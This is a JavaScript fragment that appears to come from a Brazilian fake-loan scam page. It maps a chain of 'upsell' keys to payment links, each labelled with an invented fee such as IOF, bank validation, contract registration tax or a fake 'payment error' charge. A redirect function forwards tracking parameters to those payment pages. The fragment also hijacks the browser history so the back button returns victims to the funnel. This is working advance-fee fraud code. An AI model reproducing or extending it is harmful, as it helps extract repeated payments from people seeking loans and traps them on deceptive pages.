   const baseLinks = {
  up1: "https://pay.app-agil.online/PyE2Zy8MKb23qRb", // IOF
  up2: "https://pay.final-aqui.space/q510ZObLq5J3E9D", // Validação Bancaria
  up3: "https://pay.final-aqui.space/zj6aGnAm6JlZwlK", // Seguro Prestamista "tarifa de cadastro"
  up4: "https://pay.final-aqui.space/VroegN1LkYpGKwj", // NFe
  up5: "https://pay.final-aqui.space/rn4RgQvL4Bl3wBV", // Ativar conta
  up6: "https://pay.final-aqui.space/bz5KZbVm9QYZ7dL", // Taxa de registro do contrato
  up7: "https://pay.final-aqui.space/PyE2Zy8r6Yn3qRb", // ParabÃ©ns, 20k adicional
  up8: "https://pay.final-aqui.space/7vJOGY4LnVVZKXd", // Erro no pagamento - 14,06
  up9: "https://pay.final-aqui.space/yOeXZKlLODDGAQa", // APP - 11,99
  up10: "https://pay.final-aqui.space/z0qn35dYeWVg98m", // Taxa de Abertura TAC - 16,92
  up11: "https://pay.final-aqui.space/meABG9dLrjQZ6Ea", // Taxa de Consultoria Financeira - 19,53
  up12: "https://google.com", // Taxa de Processamento Administrativo - 31,92
};

function redirect(key) {
  try {
    if (!baseLinks[key]) {
      throw new Error(`Link para ${key} não encontrado!`);
    }

    const url = new URL(baseLinks[key]);
    url.search = new URLSearchParams(window.location.search).toString();

    window.location.href = url.href;
  } catch (error) {
    console.error("Erro no redirecionamento:", error);
    alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
  }
}


const backRedirectBackLink = "/back";

// Adiciona duas entradas no histÃ³rico para capturar a navegaÃ§Ã£o para trÃ¡s
history.pushState({}, "", location.href);
history.pushState({}, "", location.href);

// Captura o evento de navegaÃ§Ã£o para trÃ¡s e redireciona
window.onpopstate = function () {
  setTimeout(() => {
    location.href = backRedirectBackLink;
  }, 1);
};
